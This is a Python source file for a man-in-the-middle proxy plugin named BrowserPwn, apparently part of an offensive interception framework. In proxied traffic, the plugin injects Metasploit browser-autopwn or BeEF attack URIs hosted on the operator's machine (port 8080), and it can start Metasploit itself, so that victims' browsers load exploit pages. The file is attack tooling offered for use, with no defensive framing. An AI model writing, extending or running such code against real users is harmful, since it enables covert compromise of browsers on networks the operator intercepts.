import os,subprocess,logging,time
from plugins.sergio_proxy.plugins.Inject import Inject
from plugins.sergio_proxy.plugins.plugin import Plugin

class BrowserPwn(Inject,Plugin):
    name = "BrowserPwn"
    optname = "browserpwn"
    desc = '''
Easily attack browsers using MSF and/or BeEF.
Inherits from Inject. Launches MSF browser autopwn if URI not provided.
'''
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        Inject.initialize(self,options)
        self.html_src = options.msf_uri
        self.js_src = options.js_url
        self.rate_limit = 2
        if self.html_src == self.js_src == "" and not options.startmsf:
            if options.msf_uripath and options.msf_lhost:
                self.html_src = "http://%s:8080%s" %\
                                    (options.msf_lhost,options.msf_uripath)
            else:
                from plugins.StartMSF import StartMSF
                StartMSF.initialize(options)
                self.html_src = "http://%s:8080/" % options.msf_lhost 
        if options.startmsf:
                if not options.msf_lhost:
                    options.msf_lhost = raw_input(
                                        "Local IP not provided. Please enter now: ")
                self.html_src = "http://%s:8080%s" %\
                                    (options.msf_lhost,options.msf_uripath)
        print self.html_src
    def add_options(self,options):
        options.add_argument("--msf-uri",type=str,default="",
            help="The attack URI given to you by MSF")
        options.add_argument("--beef-uri",type=str,default="",
                help="The attack URI given to you by BeEF")
